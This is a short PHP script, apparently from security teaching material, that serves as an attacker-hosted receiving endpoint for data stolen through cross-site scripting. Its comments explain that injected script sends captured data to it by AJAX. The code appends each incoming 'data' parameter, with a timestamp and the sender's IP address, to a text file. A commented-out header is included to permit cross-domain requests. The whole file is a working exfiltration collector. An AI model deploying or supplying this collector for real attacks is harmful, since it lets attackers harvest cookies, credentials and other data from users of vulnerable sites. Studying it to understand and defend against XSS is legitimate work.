<?php
// This file will append anything it receives in a piece of URL data named "data" into a text file named "captured_data.txt".
// It is called by injected XSS code that uses XMLHttpRequest/Fetch to make an asynchronous request (i.e. AJAX)
// It is just one way that injected code could be used to transfer captured data to an attacker.

// This file would be hosted on a server controlled by the attacker, not the server with the XSS vulnerability.
// If this file is on a different server than the target/victim, you may need to set this header to allow cross-domain requests:
// header("Access-Control-Allow-Origin: *");

$footer = " - captured ".date('r')." from ".$_SERVER['REMOTE_ADDR']."\n";
file_put_contents("captured_data.txt", $_GET["data"].$footer, FILE_APPEND);
?>